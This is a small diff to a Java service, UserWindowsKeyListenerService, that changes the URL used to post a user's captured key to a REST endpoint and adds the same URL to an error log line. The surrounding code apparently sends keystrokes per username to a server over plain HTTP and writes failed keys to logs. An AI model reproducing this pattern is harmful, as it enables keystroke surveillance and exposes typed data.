@@ -130,9 +130,9 @@ public class UserWindowsKeyListenerService implements LocaleService {
 							}
 
 							try {
-								this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
+								this.restTemplate.postForObject("http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key", key, String.class);
 							} catch (RestClientException ex) {
-								LOG.error("Невозможно отправить сообщение на {}!", Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key");
+								LOG.error("Невозможно отправить сообщение на {}!", "http://" + Resources.URL_TO_KOLAER_RESTFUL.toString() + "/system/user/" + username + "/key");
 								LOG.info("ID: {} - ({})", idTemp, key);
 							}
 
